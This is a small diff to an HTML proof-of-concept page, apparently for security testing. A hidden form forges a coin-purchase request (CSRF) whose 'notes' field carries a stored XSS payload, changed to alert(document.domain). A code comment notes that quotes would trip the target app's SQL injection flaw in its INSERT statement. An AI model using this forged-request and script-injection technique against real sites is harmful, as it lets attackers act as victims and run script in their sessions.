@@ -30,7 +30,9 @@
     <input type="hidden" name="coin_id" value="1">
     <input type="hidden" name="amount" value="0.1">
     <input type="hidden" name="buy_price" value="1">
-    <input type="hidden" name="notes" value="&lt;script&gt;alert('csrf+xss')&lt;/script&gt;">
+    <!-- Quote-free payload: single quotes would break out of the app's
+         INSERT ... '$notes' string and abort the insert (its own SQLi flaw). -->
+    <input type="hidden" name="notes" value="&lt;script&gt;alert(document.domain)&lt;/script&gt;">
   </form>
 
   <script>
